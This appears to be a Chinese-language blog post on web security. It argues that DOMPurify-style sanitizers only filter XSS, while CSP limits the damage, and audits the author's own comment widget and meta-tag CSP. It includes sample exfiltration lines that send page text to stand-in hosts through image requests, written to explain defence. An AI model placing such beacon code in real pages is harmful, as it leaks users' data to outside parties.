---
title: "净化器不是防线，是过滤器：渲染第三方内容的两道门"
description: "净化只能降低已知 payload 命中的概率，它是过滤器；CSP 才决定被绕过之后对方能拿走什么。拿我自己站上那套 DOMPurify 加 meta 版 CSP 复盘。"
date: 2026-10-26 18:20:00
category: 安全
tags: ["XSS", "CSP", "内容净化", "Web 安全"]
read_time: 16
slug: sanitizer-is-a-filter-not-a-defense
---

## 先假设第一道门已经失守

评价一个净化器的常规问法是「它能不能挡住 XSS」。这个问题问偏了：它把净化器放在防线的位置上，然后去追问一道过滤网够不够密。过滤网永远有孔，问题不在于孔有多大，而在于孔外头是什么。

换个起点：假设我今天写的那段 `DOMPurify.sanitize()` 已经失效了。它可能是漏了某个命名空间里的标签，可能是我自己加了 `ADD_ATTR` 把某个属性放行，可能是我在回退分支里手写的转义漏了一种上下文，也可能是这行代码压根没跑到。这个假设不需要理由——一个只在「认识的东西」上生效的组件，失守是时间问题，不是概率问题。

从这里往下推，问题就变成另外几个：失守之后，注入的脚本能执行吗？能往哪里发请求？能读走什么？能改掉页面的哪一部分？这些问题净化器一个都答不了，它们在 CSP 的管辖范围里。

两道门的分工，说清楚了就是一句话：**第一道门降低「己方被命中的概率」，第二道门压缩「被命中之后的后果」。把这两件事混成一件事，结果就是只做前者——而我自己的站上，长期就是这个状态。**

### 净化器认识的是它解析过的那份字符串

净化器的工作方式可以概括成三步：解析、删掉不在名单上的东西、序列化回字符串。这三步都发生在**它拿到的那份输入**上，而不是浏览器最终执行的那份 DOM 上。

这个区分在多数情况下看不出差别，因为多数输入就是一段普通 HTML。但只要浏览器对同一段字节的解析结果和净化器的解析结果不一致，中间那条缝就出现了——净化器看到的是一段死掉的文本，浏览器看到的是一棵活的、带事件处理器的树。

### 两次解析之间的缝隙

同一段字符被解析两次，是这类问题的总根源。净化器用的是自己的解析器，浏览器用的是自己的解析器，两边对畸形嵌套、未闭合标签、命名空间切换的处理并不保证一致。

几个典型的分歧点：

- **未闭合标签的补齐位置**：净化器认为某个标签在 A 处结束，浏览器把它补到了 B 处，被删掉的子节点因此换了父节点。
- **命名空间的切换**：`<svg>` / `<math>` 里的元素名和属性名走另一套规则，同一个 `<a>` 在 HTML 命名空间和 SVG 命名空间下能做的事不同。
- **序列化后再解析的往返**：净化器把 DOM 序列化成字符串的那一刻，某些实体编码、属性引号、注释边界会被重写，浏览器再解析时读到的语义可能与净化器判断时不同。

这一类问题有个统称，叫 mXSS（mutation XSS）。不需要记这个名字，记住机制就够：**净化之后再没有第二次解析，等于没有校验过第二次。**

### 上下文比 payload 更要紧

新手看 XSS 是看 payload 长什么样：有没有 `script`、有没有 `onerror`。老手看的是这段值被**放进哪里**。

同一个字符串 `Tom & Jerry <b>` 放在五个位置，需要五种不同的处理：

| 落点 | 需要的处理 | 处理错了会怎样 |
|:-----|:-----------|:---------------|
| HTML 文本节点 | 转义 `& < >` | 标签被解析执行 |
| 属性值（带引号） | 转义 `& " '` | 属性被提前闭合，注入新属性 |
| URL 的 href / src | 先校验 scheme，再做 URL 编码 | `javascript:` / `data:` 落地执行 |
| `<script>` 里的 JS 字符串 | 用 JSON 序列化，不做 HTML 转义 | 字符串提前闭合，代码注入 |
| 内联 JSON（`application/json`） | `<` 转成 `\u003c` | `</script>` 提前结束脚本块 |

真正出事的往往不是「没净化」，是「在错误的上下文里净化」。把一段 HTML 净化得干干净净，然后拼进 `onclick="..."` 里，前面那份工作全部作废——属性上下文里，HTML 净化器认为安全的字符组合可能是可执行的 JS。

## 第一道门：净化器能做什么，不能做什么

先把能力边界划清楚，后面才好谈它失守之后的事。

**它能做**：

- 把一段用户提交的 HTML 里不在白名单上的标签和属性删掉
- 处理已知的畸形嵌套、编码变形、协议混淆
- 提供一致的输出，让下游可以放心把它当 HTML 插入

**它不能做**：

- 保证自己覆盖了所有解析差异（mXSS 是持续的军备赛道，不是已解决问题）
- 保护非 HTML 的上下文——CSS、URL、JS 字符串、JSON、SVG 属性，各有各的规则
- 在你把它用错位置时救场（净化了 A，拼进了 B）
- 阻止一段**合法**的富文本干合法但你不想要的事：外链图片、自动加载的 iframe、超长文本撑爆布局
- 在它自己没加载成功时存在

最后一条不是理论问题，是加载顺序问题。前端按需 `import` 一个净化库，网络抖动、CDN 5xx、CSP 把它的源挡了，三种情况都会让 `DOMPurify` 是 `undefined`。这时候代码要么抛错整块功能挂掉，要么走回退。回退逻辑写得好不好，直接决定这扇门是有还是没有。

### 白名单比黑名单可靠的原因

黑名单的本质是「列举所有坏事」，而坏事是一个开放集合。攻击面在演化：新的标签组合、新的协议处理器、浏览器新实现的属性。黑名单只能追在已经发生过的事情后面。

白名单反过来：列举所有**允许**的事，其余默认拒绝。集合是封闭的，新出现的东西天然被挡在外面，出问题的方式变成「某个已放行的东西被滥用」，范围可控。

代价是白名单必须由人来维护，而人总会想放行一点东西。我在自己的评论组件里就干过这种事：为了让引用块里的代码能保留高亮，放行了 `class`；为了让图片能限制尺寸，放行了 `width` / `height`。每放行一个，白名单就向黑名单靠近一步。

### 五种上下文，五种转义

下面这段是我给自己写的备忘，不是可以直接抄的库，但它把「同一份数据要按落点分别处理」这件事固定下来了：

```js
// 五种落点，五种处理，不要互相替代
const esc = {
  // HTML 文本节点
  text: (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'),
  // 双引号属性值
  attr: (s) => esc.text(s).replace(/"/g, '&quot;').replace(/'/g, '&#39;'),
  // URL：先校验 scheme，再编码；只允许 http/https/mailto
  url: (s) => {
    const u = new URL(s, location.origin);
    if (!['http:', 'https:', 'mailto:'].includes(u.protocol)) return '#';
    return u.href.replace(/"/g, '%22').replace(/</g, '%3C');
  },
  // 内联 JSON：把 < 打成 \u003c，防 </script> 提前闭合
  json: (o) => JSON.stringify(o).replace(/</g, '\\u003c'),
  // JS 字符串：交给 JSON.stringify，不要手写引号
  js: (s) => JSON.stringify(s),
};
```

这张表的价值不在代码，在于它会逼你在写模板字符串时先问一句「这个位置属于哪一种」。多数注入不是因为转义函数写错了，是因为那一步压根没做——`${nickname}` 直接拼进 `onclick` 属性，谁都想不到。

## 第二道门：CSP 的职责是把影响半径压小

CSP 常被误解成「防 XSS 的」。它防不住 XSS：注入点存在就是存在，标签就在 DOM 里。CSP 管的是**这段被注入的代码能做什么**。

这个区别决定了两者的写法。想「防 XSS」的人会去堆净化规则；想「压半径」的人会去问：如果页面上出现了一段我不认识的脚本，它最坏能拿到什么？

答案拆成四个方向：

1. **能不能执行**——`script-src`
2. **能不能带走数据**——`connect-src`、`img-src`、`form-action`、`navigate-to`
3. **能不能加载外部资源替换我的界面**——`object-src`、`frame-src`、`style-src`
4. **能不能改变我的相对路径解析和表单提交目标**——`base-uri`、`form-action`

外加一个容易被忽略的：**能不能引我的站做第三方嵌入**——`frame-ancestors`，反过来的点击劫持方向。

### script-src 才是那条真边界

一条有效的 `script-src` 要满足两件事：**没有 `'unsafe-inline'`，外域是逐个列出的**。

`'unsafe-inline'` 一出现，内联脚本就随便执行——注入的 `<script>` 是内联的，注入的 `onerror=` 属性处理器也是内联的。加了它，`script-src` 只剩一个作用：挡外部脚本源。对 XSS 来说，这个作用接近于零。

没有 `'unsafe-inline'` 之后，页面里所有内联脚本都得带 `nonce` 或者 `hash`：

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-<random-per-request>' 'strict-dynamic' https://cdn.jsdelivr.net;
  style-src 'self' 'nonce-<random-per-request>';
  img-src 'self' data:;
  connect-src 'self' https://<workers-subdomain>.workers.dev;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  require-trusted-types-for 'script'
```

这份是响应头形态的示意，`nonce` 每次请求随机生成、由服务端注进 `<script>` 标签。它的关键性质是：**攻击者注入的 `<script>` 拿不到这个 nonce**，所以即使注入成功，脚本也不执行。这才是「防线」该有的样子——不依赖攻击者猜不到，而依赖它拿不到凭证。

### 数据外泄的三个出口

脚本执行只是第一步。真正让一次 XSS 从「页面被改了个字」升级成「用户数据没了」的，是外发通道。CSP 在这里能卡三个口子：

- **`connect-src`**：`fetch` / `XHR` / `WebSocket` / `sendBeacon`。默认 `'self'`，只放行确实需要的 API 域。
- **`img-src`**：`new Image().src = 'https://evil/?' + data` 是最古老的外发手法，因为它不受 CORS 约束、不需要读响应、几乎不留痕迹。
- **`form-action`**：一段注入的 `<form>` 可以把页面上的输入框内容 POST 到任意域。`form-action 'self'` 关掉这条路，且**它不会被子页面的 `default-src` 继承覆盖**，要单独写。

还有一个变体：`<a href>` 加 `target` 触发的导航。老规范里有 `navigate-to`，落地情况不齐，能靠的是 `base-uri 'self'` 配合不做开放重定向。

### 与「阻止漏洞」无关的几条指令

`object-src 'none'` 挡的是插件内容（Flash 时代遗留，现在还有 PDF、SVG 嵌入等载体）。`base-uri 'self'` 挡的是注入一个 `<base href>` 把你的相对路径全改到别的域上——这条特别隐蔽，因为它本身不执行任何代码，只是让后续所有 `src` / `href` 指向别处。

这些指令的共同点是：**它们不减少注入点，只减少注入之后的可用手段**。这正是第二道门的定义。

## 我站上那套东西长什么样

我的站点是 GitHub Pages 上的纯静态站，评论区是一个 Cloudflare Worker 加一段前端组件：游客填昵称和内容，Worker 存下来，前端拉回来渲染。也就是说，页面上有一块区域，内容**完全来自陌生人**。

这块区域的渲染逻辑，实际是这样的：

```js
// 延迟加载净化器；加载不到就走转义回退
async function renderComment(raw, nickname, ts) {
  let safe;
  try {
    const { default: DOMPurify } = await import(
      'https://cdn.jsdelivr.net/npm/dompurify@3/dist/purify.es.mjs'
    );
    safe = DOMPurify.sanitize(raw, {
      ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'code', 'pre', 'blockquote', 'a'],
      ALLOWED_ATTR: ['href', 'title', 'class'],
    });
  } catch (e) {
    // 净化器没加载成功：退到纯文本 + 转义
    safe = escapeHtml(raw).replace(/\n/g, '<br>');
  }

  // 昵称、时间、data-author 都走同一个属性位转义
  return `<article class="c" data-author="${escapeHtml(nickname)}">
    <header><b>${escapeHtml(nickname)}</b><time>${escapeHtml(ts)}</time></header>
    <div class="c-body">${safe}</div>
  </article>`;
}

// 用 DOM 自带的转义，而不是手写正则
function escapeHtml(s) {
  const div = document.createElement('div');
  div.textContent = String(s);
  return div.innerHTML;
}
```

这段代码有两处我认为是对的：**回退路径不返回原始内容**（净化失败就退到纯文本），**属性位和老老实实做转义**（`data-author` 这种位置最容易被忽略，因为它不显示给用户看，却能被 CSS 选择器和 JS 读到）。

然后是这个站的 CSP。因为 GitHub Pages 不给自定义响应头，只能把 CSP 塞进 `<meta http-equiv>`：

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net
              https://static.cloudflareinsights.com
              https://<workers-subdomain>.workers.dev;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://<workers-subdomain>.workers.dev;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests">
```

它看起来挺长，`object-src` / `base-uri` / `form-action` 都写了，`upgrade-insecure-requests` 也有。但下面这一段是本文真正的正文。

## 三处其实是摆设

### `'unsafe-inline'` 让 script-src 近乎失效

我在 `script-src` 里放了 `'unsafe-inline'`。原因很实在：站点的模板里有几段内联脚本（主题切换、评论区初始化、阅读进度条），拆成外部文件成本不低，而 GitHub Pages 上没有服务端，生成 per-request nonce 这条路走不通。

后果是明确的：**注入的 `<script>` 和内联事件处理器都能执行**。`script-src` 此时实际只剩下「外部脚本源白名单」这一个作用。任何绕过净化器的注入，在这里不会遇到第二道拦截。

这是本文最该被记住的一条：`'unsafe-inline'` 不是「稍微削弱」，它把 `script-src` 从防线降级成了配置项。写了它，就不该再对外宣称「我们有 CSP 防 XSS」。

### `img-src https:` 是一条可用的外泄信道

我写了 `img-src 'self' data: https:`。当时的理由是评论里允许贴图，而图片可能来自任何图床，逐个列出域名不现实。

问题是 `https:` 这个 scheme 通配等于**放行整个公网**。一段注入的脚本（无论是通过 `'unsafe-inline'` 还是别的路径进来的）可以用一张图片把数据带出去，手法就是 `new Image().src = 'https://collect.example.com/p?' + encodeURIComponent(document.querySelector('.c-body').innerText)`——不需要 CORS，不需要读响应，一个 `Image` 对象就够。

`connect-src 'self'` 拦不住它，因为走的是图片加载，不是 `fetch`。`form-action 'self'` 也拦不住，因为没有表单。

这一条和上一条叠在一起才致命：前者让代码能跑，后者让代码能把东西拿走。两条单独看都像「可接受的折中」。

### meta 版 CSP 里几条指令根本不生效

这一条我原来不知道，是查规范才发现的：`<meta>` 形态的 CSP **只支持一部分指令**。在 meta 里写这些是无效的，浏览器会忽略（并在控制台给一条警告）：

| 指令 | meta 里是否生效 | 原因 |
|:-----|:---------------|:-----|
| `frame-ancestors` | 不生效 | 需要在文档创建前就确定，只能走响应头 |
| `report-uri` / `report-to` | 不生效 | 上报地址必须在文档加载前注册 |
| `sandbox` | 不生效 | 与文档的浏览上下文绑定，meta 到达太晚 |
| `upgrade-insecure-requests` | 生效 | 属文档级策略 |
| `default-src` / `script-src` / `img-src` 等 | 生效 | 属资源加载策略 |

所以我这份 CSP 里确实没有 `frame-ancestors`——不是忘了写，是写了也没用，还会给人「已经防了点击劫持」的错觉。反过来说，这个站目前**对点击劫持没有任何防护**，因为 GitHub Pages 不给响应头，我没有别的地方能声明它。

知道这件事之后，我对「我们加了 CSP」这句话的信任度下降了一档：一份配置里最容易被引用为「安全」的那几行，可能根本不参与判定。

### 还有一处我原来没想到：净化器自己是 CDN 来的

`DOMPurify` 是从 `cdn.jsdelivr.net` 动态 `import` 的。这意味着**净化器本身是第三方供应链的一部分**：CDN 被投毒、包被劫持、版本被换成恶意构建，净化函数就变成了「把输入原样返回」甚至「顺手加一段 payload」。

我在 `script-src` 里放行了这个 CDN，站点的信任边界因此延伸到它。这一层不是「配置写错了」，是架构选择带来的固有成本。能做的缓解有限：锁死版本号（我锁了主版本，还能更紧）、加 SRI（`import()` 的动态模块对 SRI 支持不齐）、或者干脆自己托管一份固定版本的副本。我目前选了最弱的那档。

写这一段不是为了自证诚实，是因为它是「第一道门不可靠」的第五个理由，而前四个（解析差异、上下文错位、放行属性、加载失败）都还在代码里。

## 两道门怎么配合

把上面的东西收成可执行的顺序，我给自己定的规则是四条。

### 默认拒绝，例外逐条列出

白名单的方向不能反过来。CSP 里的每个放行项都该能回答「不放行会坏掉哪个功能」，答不上来的就删。我删过一次 `https://*.google-analytics.com`，因为那个统计脚本两个月前就不在页面上了，配置却留着。

### report-only 起步，再收紧

先只上报不拦截，拿到真实流量里的违规清单，再按清单改代码，最后切到强制。这个顺序能避免「上线即白屏」：

```http
Content-Security-Policy-Report-Only:
  default-src 'self';
  script-src 'self' 'nonce-<random>';
  report-to csp-endpoint

# 稳定后去掉 -Report-Only，并把 report-to 保留一段时间看回落
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-<random>';
  report-to csp-endpoint
```

### 收紧的优先顺序

如果只能改一处，改 `script-src` 去掉 `'unsafe-inline'`。第二处是 `img-src` 收窄到具体域名。第三处才是补净化规则。

这个顺序和直觉相反——直觉是先加固净化器。但净化器的收益是「降低命中概率」，CSP 的收益是「降低命中后的损失」，后者的期望收益更高，且不依赖于「攻击者比我们慢」。

### 别让回退路径成为唯一防线

我那套 `escapeHtml` 回退在功能上是正确的（`textContent` 再读 `innerHTML` 走的是浏览器自己的转义），但它有个隐含假设：**只有净化器失败时才会走到这里**。如果某天有人为了「让 Markdown 更好看」把回退改成「先 `innerHTML` 再修正」，这条路就变成了绕过净化的后门。回退分支要当成和主路径同等重要的代码来审。

## 判据：我会拿这几条问自己

不谈原则，谈能自查的问题。下面五条，任何一条答不上来，说明这道门是纸糊的：

1. **注入点如果今天被绕过，页面上的脚本能不能执行？** —— 去 CSP 里找 `'unsafe-inline'`，找到就是能。
2. **执行之后，数据能发到哪里？** —— 看 `img-src`、`connect-src`、`form-action`，有没有 scheme 通配（`https:`、`data:`）。
3. **我这份 CSP 的每一条指令，在当前投放方式下真的生效吗？** —— meta 形态下逐条对着规范核一遍，别把 `frame-ancestors` 当成已配置。
4. **净化器的加载失败路径，返回的是什么？** —— 是纯文本，还是原始内容，还是一段 `innerHTML`。
5. **我放行的每一个标签和属性，是哪个功能逼出来的？** —— 举不出功能的，就是在给白名单掺黑名单。

补一条元问题：**我能不能在不看代码的情况下，说出这个站点「最坏情况会丢什么」？** 说不出来，说明两道门的边界都还没画清。

## 收束

我原来对这套东西的理解是「净化做好了就安全」。现在的位置是：净化该做，但它是**过滤器**——它的价值是让大多数噪音停在门外，让日志里的异常变少，让常见的扫描器扫不出东西。它不承诺边界，因为它只能对它认识的东西生效，而「认识」这件事的质量上限由攻击者的创造力决定。

CSP 是**防线**，因为它不依赖「我认不认识这个 payload」。它只依赖一件事：这段代码有没有凭证（nonce / hash / 白名单源）。没有就不执行，有就执行——判定规则里不含「内容长什么样」。

我站上现在的状态是：第一道门做得还行，第二道门有三处是摆设。这个状态不会因为写了一篇文章就变好，它得靠把那段内联脚本搬出去、把 `img-src` 收窄、把 CDN 上的净化器换成自托管。这些是工程量，不是认知问题。

写下来是因为，把「过滤器」叫作「防线」这件事本身有代价：它会让人在配置项勾完之后停止追问，而追问恰好是唯一能发现「写了也没用」的方式。
